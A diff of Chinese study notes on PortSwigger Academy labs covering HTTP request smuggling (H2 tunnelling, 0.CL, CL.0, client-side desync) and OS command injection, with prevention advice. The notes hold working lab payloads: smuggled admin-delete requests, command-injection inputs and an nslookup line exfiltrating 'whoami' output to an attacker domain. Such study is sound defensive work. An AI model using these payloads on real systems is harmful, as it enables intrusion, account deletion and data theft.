+
+* 在 blog 中找一篇提交一份评论，然后在 BurpSuite 中将刚才的请求发送到 Repeater 中，进行修改，大致如下：
+
+  ```http
+  POST /post/comment HTTP/2
+  Host: 0af70038044fb30280753583001100e7.web-security-academy.net
+  Cookie: session=b2VlYuhxeTGVrHaqASskDsY0xBr4nTPr
+  
+  csrf=I102H44V2OiBRShm8aYJB6GQiyBn3m6x&postId=4&name=attacker&email=b@ad.man&website=http://malicio.us&comment=xxx
+  ```
+
+* 正常会收到 302 跳转说明请求正常
+
+  ```http
+  HTTP/2 302 Found
+  Location: /post/comment/confirmation?postId=4
+  X-Frame-Options: SAMEORIGIN
+  Content-Length: 0
+  
+  ```
+
+* 在文章评论能看到刚提交的内容
+
+  <img src="../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103173517016.png" alt="image-20261103173517016" style="zoom:150%;" />
+
+* 修改请求，在右侧 Inspector 中的 Request Header 添加一个请求头以通过走私隧道获取前端添加的内部 header，请求内容大致如下：
+
+  ```http
+  POST /post/comment HTTP/2
+  Host: 0af70038044fb30280753583001100e7.web-security-academy.net
+  Content-Type: application/x-www-form-urlencoded
+  Foo: bar
+  Cookie: session=b2VlYuhxeTGVrHaqASskDsY0xBr4nTPr
+  Content-Length: 210
+  
+  csrf=I102H44V2OiBRShm8aYJB6GQiyBn3m6x&postId=4&name=attacker&email=b@ad.man&website=http://malicio.us&comment=
+  
+  
+  ```
+
+  ![image-20261103183112628](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103183112628.png)
+
+* response 以 302 跳转返回，刷新该文章评论中会插入内部 header：
+
+  ```
+  : Content-Length: 3 X-SSL-VERIFIED: 0 X-SSL-CLIENT-CN: null X-FRONTEND-KEY: 807187393228828
+  ```
+
+* 添加一个 HEAD 方法请求 / 路径到 repeater 中，修改添加 header 如下：
+
+  ```http
+  foo: bar
+  
+  GET /admin HTTP/1.1
+  X-SSL-VERIFIED: 1
+  X-SSL-CLIENT-CN: administrator
+  X-FRONTEND-KEY: 807187393228828
+  
+  
+  ```
+
+* ```http
+  HTTP/2 500 Internal Server Error
+  Content-Type: text/html; charset=utf-8
+  Content-Length: 151
+  
+  <html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Received only 3180 of expected 8915 bytes of data</h1></body></html>
+  ```
+
+* 上面错误表示 HEAD 请求的 / 返回字节 8915 大于内部请求 /admin 返回的页面数据 3180，需要找一个适当的资源重试，这里找到一个`/resources/labheader/images/ps-lab-notsolved.svg` 约 800 左右，修改后请求：
+
+* ![image-20261103184549063](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103184549063.png)
+
+* 走私的请求返回 401 未授权，经过排查是 comment 中获取的字节少了一位，应该是 `X-FRONTEND-KEY: 8071873932288288`，修改后再次重试：
+
+* ![image-20261103185302523](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103185302523.png)
+
+* 返回 200，再次将 URL 修改为删除 carlos，如下：
+
+* ```http
+  foo: bar
+  
+  GET /admin/delete?username=carlos HTTP/1.1
+  X-SSL-VERIFIED: 1
+  X-SSL-CLIENT-CN: administrator
+  X-FRONTEND-KEY: 8071873932288288
+  
+  
+  ```
+
+* 请求结果：
+
+* ```http
+  HTTP/2 500 Internal Server Error
+  Content-Type: text/html; charset=utf-8
+  Content-Length: 149
+  
+  <html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Received only 372 of expected 809 bytes of data</h1></body></html>
+  ```
+
+* 虽然提示返回的字节超过期待数量，但是已经成功触发删除 URL，刷新页面即可看到 solved。
+
+* ![image-20261103185606397](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103185606397.png)
+
+  
+
+
+
+
+
+#### 经过 HTTP/2 请求隧道缓存投毒
+
+请求隧道比经典的走私场景更受限，但仍然可以构造高严重性的攻击。例如 web 缓存投毒。  
+
+通过非盲请求隧道，可以将一个 response 的 header 和另一个 response 的 body 混合搭配。如果 body 中反射了未编码的用户输入，就可以利用，在浏览器中不会执行代码的上下文中实现反射型 XSS。  
+
+示例，未编码的、攻击者可控的输入：
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{ "name" : "test<script>alert(1)</script>" }
+[etc.]
+```
+
+本身这个 response 为 application/json 类型，不会造成危险。但结合请求隧道到后端，这个 response 出现在另一个 response 的 body 中，并且继承第二个 response 的 `content-type` ：
+
+```http
+
+:status	200
+content-type	text/html
+content-length	174
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{ "name" : "test<script>alert(1)</script>" }
+[etc.]
+```
+
+由于缓存在前端，这些混合的响应内容就可能会被返回给其他用户。  
+
+
+
+
+
+
+
+### 0.CL 请求走私
+
+0.CL 脱同步攻击的前提是前后端存在 **H-V（Hidden-Visible）** 差异 ，是发送在前端忽略 `Content-Length` 头，认为请求不存在 body，后端服务器处理 `Content-Length` 的情况下持续等待 body 到达。这种场景长期被认为存在死锁不可利用。  
+
+
+
+示例，前端忽略 CL 头 ，会将下面请求视为2个发送到后端：
+
+```http
+GET /Logon HTTP/1.1
+Host: <redacted>
+Content-Length:
+ 7
+
+GET /404 HTTP/1.1
+X: Y
+```
+
+后端服务器处理 CL 头，收到第一个请求会一直等待后续 body 数据直到超时。  
+
+
+
+**early-response gadget**  
+
+但通过将 0.CL 与一个提前响应组件(early-response gadget)结合（这是一种使后端收到完整请求体之前就做出响应的技术），攻击者就可以打破死锁，然后使用双脱同步（double desync）来构建完整的利用。  
+
+
+
+一些 **early-response gadget** ：
+
+* IIS：`GET /con` ，CON 等一些关键字在 Windows 中属于保留名称
+* Nginx：静态文件，响应静态文件时不等待 request body
+* 通用的：服务器级别的重定向，因为重定向不需要 request body
+* Apache：暂未发现，出错会立即关闭连接
+
+
+
+示例，访问 IIS 的请求，如果命中  /con 这种保留名称 URL，IIS 不会等待 body 到达就做出响应，并且保持连接开放：
+
+```http
+GET /con HTTP/1.1
+Host: <redacted>
+Content-Length:
+ 7
+
+GET / HTTP/1.1
+Host: <redacted>
+```
+
+用户视角：![image-20261105113007930](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261105113007930.png)
+
+后端服务器视角：
+
+![image-20261105113050143](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261105113050143.png)
+
+
+
+
+
+
+
+**双脱同步**  
+
+核心思路是将 0.CL 转换为 CL.0，分 3 个阶段，关键技巧是利用大多数服务器在头部块末尾插入额外头部，如果走私从头部快前方开始，追加的头部落在走私请求之后，不影响 CL 的计算，攻击就能够相对可靠的起效：
+
+```
+阶段 1：0.CL 毒化
+  POST /nul HTTP/1.1
+  Content-length:
+   163
+
+  POST / HTTP/1.1
+  Content-Length: 111
+  ...
+  ↓
+  前端看不到 CL，缓冲 POST / 请求
+  后端看到 CL=163，等待请求体
+  但 /nul 是提前响应 gadget，后端立即返回响应
+  连接保持开放，POST / 请求留在后端缓冲区
+
+阶段 2：CL.0 武器化
+  后端缓冲区中的 POST / 请求被处理
+  它的 CL=111 让后端继续读取请求体
+  但实际数据是 GET / HTTP/1.1...（来自下一个请求）
+  → 形成 CL.0 脱同步，恶意前缀被注入
+
+阶段 3：毒化受害者
+  恶意前缀 + 受害者请求 → 有害响应
+```
+
+
+
+**Expect头**  
+
+核心是发现 `Expect: 100-continue` 会破坏前端对请求体的处理逻辑，该请求头是早期的优化头。  
+
+除了原始的头，还存在混淆头：`Expect: y 100-continue` ，即在原始头中混杂一些内容，让前端忽略该头，后端处理，产生 0.CL。  
+
+T-Mobile 示例：
+
+```http
+GET /logout HTTP/1.1
+Host: <redacted>.t-mobile.com
+Expect: 100-continue
+Content-Length: 291
+
+HTTP/1.1 404 Not Found          ← 后端返回 404，不是 100
+GET /logout HTTP/1.1
+Host: <redacted>.t-mobile.com
+Content-Length: 100
+
+GET / HTTP/1.1
+Host: <redacted>.t-mobile.com
+
+GET https://psres.net/assets HTTP/1.1
+X: y
+HTTP/1.1 200 OK
+GET / HTTP/1.1
+Host: <redacted>.t-mobile.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://psres.net/…   ← 成功重定向到攻击者域名
+```
+
+
+
+
+
+
+
+
+
+0.CL 脱同步漏洞是一个较新发现的请求走私形式。  
+
+参考：https://portswigger.net/research/http1-must-die  
+
+作者列出的一些时间线：
+
+- 2004: [HTTP Request Smuggling](https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf) – (largely forgotten)
+- 2016: [Hiding wookies in HTTP](https://media.defcon.org/DEF CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf) (largely ignored at the time)
+- 2019: [Exploit header parser discrepancies](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) (CL.TE, TE.CL)
+- 2021: [Exploit HTTP/2 downgrading](https://portswigger.net/research/http2) (H2.CL, H2.TE)
+- 2022: [Exploit endpoints that ignore CL](https://portswigger.net/research/browser-powered-desync-attacks) (CL.0, H2.0, CSD)
+- 2024: [Exploit dechunking](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/) (TE.0)
+- 2025: [Exploit chunk extensions (TE.TE)](https://w4ke.info/2025/06/18/funky-chunks.html)
+- Just now: 0.CL desync attacks
+
+
+
+## 基于浏览器的请求走私
+
+
+
+### CL.0 请求走私
+
+有时一些后端服务器可以被忽悠忽略 CL 头，这意味着它们会忽略请求的 body，等同于 ` Content-Length: 0` ，因此称为 CL.0 漏洞。这开启了一条不需要 TE 或者 H2 的 HTTP 请求走私方法。
+
+
+
+#### 探测
+
+探测 CL.0 漏洞，首先发送一个在其请求体中包含另一个部分请求的请求，然后发送一个正常的后续请求。然后检查后续请求的响应中是否收到了走私前缀的影响。  
+
+示例请求：
+
+```http
+POST /vulnerable-endpoint HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: xGET / HTTP/1.1
+Host: vulnerable-website.com
+```
+
+两条请求的响应：
+
+```http
+HTTP/1.1 200 OK
+
+
+
+HTTP/1.1 404 Not Found
+```
+
+这里没有篡改任何请求头。  
+
+可以在 BurpSuite 中按照如下操作：
+
+* 创建一个包含设置请求的 tab，和另一个包含任意请求的 tab
+* 将两个 tab 添加到一个组中
+* 使用发送按钮旁边的按顺序发送组
+* `Connection` 头改为 `keep-alive`
+* 发送序列然后检查 response
+
+
+
+在实际环境中，主要重点应放在服务器级别的重定向、静态资源上，而其它不接收 POST 请求的 endpoint 上大多数隐式的认为没有 body，因此不会观察到。  
+
+
+
+
+
+#### 诱导 CL.0
+
+如果找不到容易攻击的 endpoint，可以尝试触发服务器错误来诱导该行为。一些服务器会发出错误 response，然后不从套接字上读取剩余 body 数据，如果此时它们不关闭连接，就可以成为 CL.0 脱同步漏洞的一环。  
+
+也可以尝试类似 TE.TE 中的头部混淆技术，想办法对前端展示 CL 头但对后端隐藏。  
+
+
+
+#### 利用 lab 实验
+
+前端阻塞了访问 /admin 这个 URL 的请求，需要通过走私请求删除账户。  
+请求1：
+
+```http
+GET /resources/images/avatarDefault.svg HTTP/1.1
+Host: 0aae0016036482cc807b9e8b0000000b.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+GET /admin/delete?username=carlos HTTP/1.1
+Foo: x
+```
+
+请求2：
+
+```http
+GET / HTTP/1.1
+Host: 0aae0016036482cc807b9e8b0000000b.web-security-academy.net
+Connection: keep-alive
+
+```
+
+上面两个请求添加到同一个组中，按顺序发送，响应1：
+
+```http
+HTTP/1.1 200 OK
+Content-Type: image/svg+xml
+Cache-Control: public, max-age=3600
+X-Frame-Options: SAMEORIGIN
+Keep-Alive: timeout=10
+Content-Length: 9881
+
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Generator: Adobe Illustrator 22.1.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg"  x="0px" y="0px"
+     viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
+<style type="text/css">
+	.st0{fill:#BCD4E8;}
+	.st1{fill:#EDF5F9;}
+	....... omit .......
+```
+
+响应2：
+
+```http
+HTTP/1.1 302 Found
+Location: /admin
+Set-Cookie: session=QduwPcgc1617wZo23WFhZE86vHzeIasl; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Keep-Alive: timeout=10
+Content-Length: 0
+
+```
+
+
+
+
+
+
+
+### 客户端脱同步攻击
+
+https://portswigger.net/web-security/request-smuggling/browser/client-side-desync
+
+请求走私传统上是服务器端要考虑的，因为利用这些漏洞需要 BurpSuite 之类的工具，标准的浏览器不会发送这种类型的请求去触发脱同步。但从上面 CL.0 实验可以看出，有时候可以使用完全兼容浏览器 HTTP/1 的请求来制造脱同步。  
+
+![image-20261106161143607](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261106161143607.png)
+
+CSD(Client-Side Desync)是使得受害者 web 浏览器和网站连接之间脱同步的攻击。  
+
+有时有些 web 服务器在不读取 body 的情况下响应 POST 请求，如果后续允许浏览器复用同一连接，就会导致客户端脱同步。  
+
+主要涉及下面几个阶段：
+
+1. 受害者访问的任意域名上包含恶意 JS 脚本
+2. 这个 JS 脚本导致受害者浏览器请求目标网站，这个请求的 body 中包含了攻击者控制的请求前缀，就像普通请求走私一样
+3. 服务器响应受害者请求后，body 中的恶意前缀保留在服务器 TCP/TLS 套接字上，这就使得与浏览器连接脱同步
+4. 然后 JS 脚本继续使用被毒化的连接发送下一个请求，此请求被追加到恶意前缀上，从而引出服务器的 response
+
+重要的是目标服务器必须不支持 HTTP/2 ，客户端脱同步依赖于 HTTP/1.1 连接复用，如果服务器支持客户端将优先使用 HTTP/2。
+
+
+
+
+
+
+
+### 基于暂停的脱同步攻击
+
+有些网站隐含的脱同步漏洞，只有在请求中途暂停时才会展现出来。通过发送 header，声明一个 body，然后等待。有时就能发现脱同步漏洞。
+
+
+
+
+
+## 预防
 
 * 尽可能使用 HTTP/2 端到端并且关闭 HTTP 降级。
 * 规范前端服务中带歧义的请求，让后端服务器拒绝带有歧义的请求，关闭对应 TCP 连接。
@@ -4461,7 +5492,7 @@ GET //attacker-website.com/example → Location: //attacker-website.com/example/
 
 
 
-## SSTI(Server-side Template Injection) 服务端模板注入
+# SSTI(Server-side Template Injection) 服务端模板注入
 
 
 
@@ -4469,35 +5500,267 @@ GET //attacker-website.com/example → Location: //attacker-website.com/example/
 
 
 
-## CORS
+# CORS
 
 
 
 
 
-## Clickjacking（UI redressing）
+# Clickjacking（UI redressing）
 
 
 
 
 
-## OS command injection
+# OS command injection
+
+
+
+## 命令注入示例
+
+假设一个购物网站使用如下URL查询库存：
+
+```http
+https://insecure-website.com/stockStatus?productID=381&storeID=29
+```
+
+由于历史原因，系统中需要转换参数给如下程序来获取库存：
+
+```sh
+stockreport.pl 381 29
+```
+
+上面程序输出库存状态和商品说明返回给用户。由于没有防御命令注入，就可以使用如下方式注入命令：
+
+```bash
+& echo aiwefwlguh &
+```
+
+echo 命令会输出一些字符串，`&` 字符会分割命令，命令结果和错误消息随着程序一起返回：
+
+```bash
+Error - productID was not provided
+aiwefwlguh
+29: command not found
+```
+
+要注入的命令后面也添加 `&` 符号可以避免后续参数干扰命令注入。  
+
+
+
+示例 lab：
+
+```http
+POST /product/stock HTTP/2
+Host: 0a1c000104f5317a82527e02002700c8.web-security-academy.net
+... omit ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+
+productId=%26%20whoami%20%26&storeId=2
+```
 
 
 
 
 
-## API Testing
+## 获取信息命令
+
+当确认存在命令注入漏洞后，就可以尝试获取一些环境相关信息：
+
+| Purpose of command    | Linux         | Windows         |
+| --------------------- | ------------- | --------------- |
+| Name of current user  | `whoami`      | `whoami`        |
+| Operating system      | `uname -a`    | `ver`           |
+| Network configuration | `ifconfig`    | `ipconfig /all` |
+| Network connections   | `netstat -an` | `netstat -an`   |
+| Running processes     | `ps -ef`      | `tasklist`      |
 
 
 
-## JWT
+## 盲注
+
+很多应用程序存在命令盲注漏洞，不会返回输出到 HTTP 的 response 中。但结合不同的技术仍然可以加以利用。  
+
+假设一个网站程序允许用户提交 feedback 消息，服务端程序生成一封邮件到网站管理员对应邮箱账户，内容通过 `mail` 程序发送：
+
+```
+mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
+```
+
+执行结果不会通过 response 返回。  
+
+
+
+### 延迟探测
+
+可以通过一些触发延迟的命令探测盲注，例如 ping ：
+
+```bash
+& ping -c 10 127.0.0.1 &
+```
+
+上面命令执行产生大约 10s 左右延迟。  
+
+示例 lab，通过提交脚注注入命令：
+
+```http
+POST /feedback/submit HTTP/2
+Host: 0a5b0032035a47fd8002d503005a002c.web-security-academy.net
+Cookie: session=WYRa56PEP9MHOjHfuokFUlcVVxO22u5s
+Content-Length: 114
+Content-Type: application/x-www-form-urlencoded
+
+csrf=zXQPniKmbALnpFIbM3IlZRhlRG6eE3Ln&name=abc&email=a@b.c%26%20ping -c 10 127.0.0.1%20%26&subject=hhh&message=aaa
+```
 
 
 
 
 
-## NoSQL injection
+### 重定向输出探测
+
+如果能够重定向输出到 web 网站目录下的文件，并且该文件可以通过 URL 访问到，就可以通过这种方式来探测。  
+
+假设用户静态资源存放在 `/var/www/static`，可以尝试如下注入：
+
+```bash
+& whoami > /var/www/static/whoami.txt &
+```
+
+然后尝试访问 `https://vulnerable-website.com/whoami.txt` 读取结果。  
+
+示例lab，网站将产品相关图片存放在`/var/www/images/` ，可以向该路径中重定向输出，然后检测：
+
+```http
+POST /feedback/submit HTTP/2
+Host: 0a4d0066047606e68038531600460025.web-security-academy.net
+Cookie: session=JW9IphfJTJtmdfzfUYTFKnYcqe9LJ4Dn
+
+csrf=TD9edv5uLA2wijjBXmpdXHsYRnNWqldZ&name=aa&email=att%40ack.er%26%20whoami > /var/www/images/whoami.jpg%20%26&subject=def&message=hahahah
+```
+
+请求对应资源：
+
+```http
+GET /image?filename=whoami.jpg HTTP/2
+Host: 0a4d0066047606e68038531600460025.web-security-academy.net
+
+
+```
+
+response:
+
+```http
+HTTP/2 200 OK
+Content-Type: image/jpeg
+Set-Cookie: session=qhYgnRGnnPKZ1VLarQewCDanSuMs0wfY; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 13
+
+peter-nojGLI
+
+```
+
+
+
+### OAST 带外管理
+
+如果能够注入命令通过触发带外网络与你掌握的主机系统交互，可以尝试类似命令：
+
+```bash
+& nslookup kgji2ohoyw.web-attacker.com &
+```
+
+攻击者可以通过监控对应特定域名的 nslookup 的查询记录探测命令是否成功注入。  
+
+还有一种可以通过带外管理携带信息的 nslookup 方式：
+
+```bash
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+```
+
+如果成功通过带外管理触发 nslookup，这会导致 DNS 产生类似如下记录：
+
+```bash
+wwwuser.kgji2ohoyw.web-attacker.com
+```
+
+示例lab，提示需要 collaborator，但尝试往xxx.burpcollaborator.net地址发送 nslookup 就能够触发解决lab（另一个携带whoami 信息的lab无法通过此方法解决） ：
+
+```http
+POST /feedback/submit HTTP/2
+Host: 0a6b00fc0419b9d680d02652008c006b.web-security-academy.net
+Cookie: session=LjvS1cga0eZ5osm2lNbFLWxwMCdDofu3
+
+csrf=Df1HHp9vnB7L4QSbJa8CnImlOdhcJ1wx&name=attacker&email=b%40ad.man%26%20nslookup skjdlsjdlsjdlsjld.burpcollaborator.net%20%26&subject=ping&message=ssssssss
+```
+
+
+
+
+
+## 注入命令的方式
+
+可以使用很多 shell 元字符进行命令注入攻击，这些命令在 Windows、UNIX 中都可以使用，以链式命令的方式注入：
+
+```bash
+&
+&&
+|
+||
+```
+
+UNIX 中可以使用的：
+
+- `;`
+
+- Newline (`0x0a` or `\n`)
+
+- ```
+  ` injected command `
+  $(injected command)
+  ```
+
+不同的元字符行为有差异，可能在不同场景下影响效果。  
+
+有时注入命令是在原始命令的引号中，此时需要在合适的 shell 元字符注入之前使用 `"` 、`'` 之类的终止引用的上下文。  
+
+
+
+## 预防命令注入
+
+最有效的是永远不在应用层代码中调用 OS 命令，使用更安全的平台 API 来实现相关功能。  
+
+如果必须使用用户的输入来调用 OS 命令，必须进行强输入验证，一些场景中的示例：
+
+* 针对白名单做输入验证
+* 验证输入是一个数字
+* 验证输入只包含字母数字字符，不允许空格或其它语法
+
+不要尝试转义 shell 元字符净化输入，在实践中很容易出错且容易被绕开。  
+
+
+
+
+
+# API Testing
+
+
+
+
+
+# OAuth
+
+
+
+# JWT
+
+
+
+
+
+# NoSQL injection
 
 
 
